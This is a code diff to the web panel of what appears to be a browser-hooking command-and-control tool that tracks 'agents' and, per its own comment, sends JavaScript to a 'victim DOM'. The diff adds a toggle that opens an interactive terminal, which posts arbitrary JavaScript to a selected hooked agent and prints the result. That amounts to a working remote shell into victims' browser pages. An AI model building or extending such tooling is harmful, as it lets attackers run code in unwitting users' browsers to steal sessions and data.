@@ -93,6 +93,7 @@ function updateSidebar(){
 
 // SHOW AGENT
 function showAgent(agentID){
+  window.current_agentID=agentID
   if(queuefetchAgentRequests.length !== 0){
     fetchAgentAbortcontroller.abort();
     resetAbortFetchAgentController();
@@ -106,7 +107,7 @@ function showAgent(agentID){
         agentDisplayed = agent;
       	agentHtml = `
       	<br/>
-      	<div class="jumbotron">
+      	<div class="jumbotron" id="agent_info_panel">
       	  <h3 class="display-4">${agent.id}</h3>
       	  <br/>
         	<b>IP:</b>${agent.ip}</b>
@@ -165,12 +166,62 @@ function showAgent(agentID){
             agentHtml += `<hr/>`;
           }
         }
+        //Switch to start Terminal
+        agentHtml += `
+        <div class="custom-control custom-switch">
+          <input type="checkbox" class="custom-control-input" id="show_dom_shell">
+          <label class="custom-control-label" for="show_dom_shell">Start DOM JS Shell</label>
+        </div>
+        `
+        //[End] Switch to start Termina
+
         agentHtml += `
         </div>`;        
         $mainPanel.html(agentHtml);
     });
   });
 }
+
+// Switch for JS Terminal
+$(document).on("click", "#show_dom_shell", function() {
+  if ($('input#show_dom_shell').is(":checked") && $('#terminal').length == 0) {
+    $('#agent_info_panel').append($('<div>', {
+      class: 'terminal',
+      id: 'terminal'
+    }));
+    $(document).ready(function() {
+      term = $('#terminal').terminal(function(command, term) {
+        term.pause();
+        $.ajax({
+          type: "POST",
+          contentType: "application/json",
+          url: 'dom/' + window.current_agentID,
+          data: JSON.stringify({
+            js: command
+          }),
+          dataType: "json"
+        }).done(function(response) {
+          if (('result' in response) && response['result'] != null) {
+            term.echo(response['result']).resume();
+          } else if (('result' in response) && response['result'] == null) {
+            term.echo("Null").resume();
+          } else {
+            term.echo("timeout").resume();
+          }
+
+        }).fail(function(response) {
+          term.echo("Failed..dom agent probably offline").resume();
+
+        });
+      });
+    });
+
+
+  } else if (!$('input#show_dom_shell').is(":checked") && $('#terminal').length != 0) {
+    $('#terminal').remove()
+  }
+
+});
 
 // SEND JS TO VICTIM DOM IF EVER GETS TRIGGERED
 $(document).on("click", "button#dom-command", function(){
@@ -240,6 +291,7 @@ $(document).on("click", "a[data-action='auto-load-module']", function(){
 // LOAD AGENT DETAILS
 $(document).on("click", "a[data-action='show-agent']", function(){
 	showAgent($(this).data('agent-id'));
+
 });
 
 // DELETE AGENT
